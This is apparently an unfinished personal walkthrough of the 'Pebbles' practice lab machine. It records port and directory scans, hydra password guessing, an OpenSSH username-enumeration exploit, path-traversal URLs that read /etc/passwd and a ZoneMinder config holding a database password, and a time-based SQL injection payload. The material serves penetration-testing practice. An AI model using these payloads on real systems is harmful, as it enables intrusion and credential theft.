# Pebbles
## Table of Contents
* [Summary](#summary)
* [Enumerate](#enumerate)
  * [Ports](#ports)
  * [Services](#services)
    * [SSH](#ssh)
    * [FTP](#ftp)
    * [HTTP](#http)
* [Exploit](#exploit)
  * [Online Password Guessing](#online-password-guessing)
* [Escalate](#escalate)
* [Explore](#explore)
* [Effect](#effect)

## Summary
* Hostname: pebbles 
* IP address: 192.168.69.52
* Domain: 
* TCP Ports and Services
  * 21
    * vsftpd 3.0.3
  * 22
    * OpenSSH 7.2p2
  * 80
    * Apache 2.4.18
    * Pebbles
    * ZoneMiner 1.29
    * CakePHP 2.8.0 (PHP 5.2.8)
  * 3305
    * Apache 2.4.18
    * ZoneMiner 1.29
    * CakePHP 2.8.0 (PHP 5.2.8)
  * 8080 
    * Apache 2.4.18
    * Tomcat 9
    * ZoneMiner 1.29
    * CakePHP 2.8.0 (PHP 5.2.8)
* OS
  * Distro: Ubuntu 16.04.6 LTS (ref: /etc/issue via LFI)
  * Kernel: Linux 3.11 - 4.1 (ref: Nmap)
* Users
  * Sally (ref: /etc/passwd via LFI)
* Vulnerabilities
  * CVE-??? (ref:)
* Exploits
  * sqlmap (ref:)
* Flag
  * ???
* Hints
  * Brute-force hidden directories of a website. You might want to use a larger wordlist for this. Locate the application name and version. 
* References
  * https://packetstormsecurity.com/files/140927/ZoneMinder-XSS-CSRF-File-Disclosure-Authentication-Bypass.html

# Enumerate
```bash
TARGET=192.168.69.52
NAME=pebbles
mkdir $NAME
mkdir $NAME/exploits
mkdir $NAME/loot
mkdir $NAME/scans
mkdir $NAME/screenshots
sudo save-screenshots-here $NAME/screenshots
cd $NAME
```

## Ports
```bash
sudo nmap $TARGET -sS -sU --min-rate 1000 -oN scans/$NAME-nmap-initial
sudo nmap $TARGET -sS -sU -p- --min-rate 1000 -oN scans/$NAME-nmap-complete
sudo nmap $TARGET -sV $(print-open-ports-from-nmap-scan scans/$NAME-nmap-complete) -oN scans/$NAME-nmap-versions

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-16 22:25 EDT
Nmap scan report for 192.168.69.52
Host is up (0.086s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
3305/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.82 seconds
```

## Services
### HTTP
```bash
dirsearch -u 192.168.54.52:80 -o /home/victor/pg/pebbles/scans/pebbles-dirsearch-80 --format=simple
dirsearch -u 192.168.54.52:3305 -o /home/victor/pg/pebbles/scans/pebbles-dirsearch-3305 --format=simple
dirsearch -u 192.168.54.52:8080 -o /home/victor/pg/pebbles/scans/pebbles-dirsearch-8080 --format=simple

# output (recursive search against TCP port 80)
[23:01:19] 301 -  312B  - /css  ->  http://192.168.69.52/css/                                            
[23:01:22] 301 -  315B  - /images  ->  http://192.168.69.52/images/                                                          
[23:01:22] 200 -    1KB - /images/     (Added to queue)         
[23:01:22] 200 -    1KB - /index.php                                                                                                  
[23:01:22] 200 -    1KB - /index.php/login/     (Added to queue)
[23:01:23] 301 -  319B  - /javascript  ->  http://192.168.69.52/javascript/ 

# output (recursive search against TCP port 3305)
[23:05:01] 200 -   11KB - /index.html                                                                                                 
[23:05:02] 301 -  326B  - /javascript  ->  http://192.168.69.52:3305/javascript/      
[23:05:09] 403 -  280B  - /server-status/     (Added to queue) 

# output (recursive search against TCP port 8080)
[23:10:11] 301 -  323B  - /WEB-INF  ->  http://192.168.69.52:8080/WEB-INF/                             
[23:10:11] 200 -  941B  - /WEB-INF/     (Added to queue)
[23:10:12] 403 -  280B  - /WEB-INF/web.xml                                                        
[23:10:24] 403 -  280B  - /cgi-bin/     (Added to queue)                                                                   
[23:10:28] 200 -   21KB - /favicon.ico                                                                                       
[23:10:30] 200 -   11KB - /index.php                                                                                                  
[23:10:30] 200 -   11KB - /index.php/login/     (Added to queue)
[23:10:31] 301 -  326B  - /javascript  ->  http://192.168.69.52:8080/javascript/ 
```
```bash
/WEB-INF/web.xml                                                        

# output
The Web Application Deployment Descriptor for your application. This is an XML file describing the servlets and other components that make up your application, along with any initialization parameters and container-managed security constraints that you want the server to enforce for you. 
```
```bash
dirb http://$TARGET -r -z10 -o scans/pebbles-dirb

# output
NSTR
```
```bash
nikto -h $TARGET -T 2 -Format txt -o scans/$NAME-nikto-misconfig

# output
NSTR
```
```bash
sudo nmap $TARGET --script http-shellshock -oN scans/$NAME-nmap-script-http-shellshock

# output: 80, 3305, 8080 
NSTR
```

# Exploit
## Online Password Guessing
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.69.52 http-post-form "/index.php?:username=^USER^&password=^PASS^:Incorrect username or password..."

# output
NSTR
```

Brute forcing SSH usernames. Discovered couchdb is an Apache-based web app. 
```bash
searchsploit openssh 7.2
searchsploit -x 40136
pip install paramiko
pip install numpy
python 40136 192.168.103.52 -U /usr/share/wordlists/metasploit/unix_users.txt

# output
[+] chronos - timing: 0.03030900000000014
[+] chrony - timing: 0.03318299999999996
[+] couchdb - timing: 0.02491600000000016
```

## Offline Password Guessing
Hashcat
```bash
hashcat -m 1000 -a 0 --force --show $HASHDUMP /usr/share/wordlists/rockyou.txt 
```

John the Ripper
```bash
unshadow $PASSWD_FILE $SHADOW_FILE > $HASHDUMP
john demo-unshadow --wordlist=/usr/share/wordlists/rockyou.txt
```


```bash
firefox http://192.168.54.52/zm/index.php?view=file&path=/../../../../../etc/passwd

# REFERENCES
```

```bash
firefox http://192.168.54.52/zm/index.php?view=file&path=/../../../../../etc/zm/zm.conf

# OUTPUT
# Username and group that web daemon (httpd/apache) runs as
ZM_WEB_USER=www-data
ZM_WEB_GROUP=www-data

# ZoneMinder database type: so far only mysql is supported
ZM_DB_TYPE=mysql

# ZoneMinder database hostname or ip address
ZM_DB_HOST=localhost

# ZoneMinder database name
ZM_DB_NAME=zm

# ZoneMinder database user
ZM_DB_USER=root

# ZoneMinder database password
ZM_DB_PASS=ShinyLucentMarker361
```

SQL injection
```bash
firefox http://192.168.54.52/zm/index.php?view=request&request=log&task=query&limit=100;(SELECT%20*FROM%20(SELECT(SLEEP(5)))OQkj)
```

```bash
admin
*4ACFE3202A5FF5CF467898FC58AAB1D615029441
```

# Explore

# Escalate


# Effect
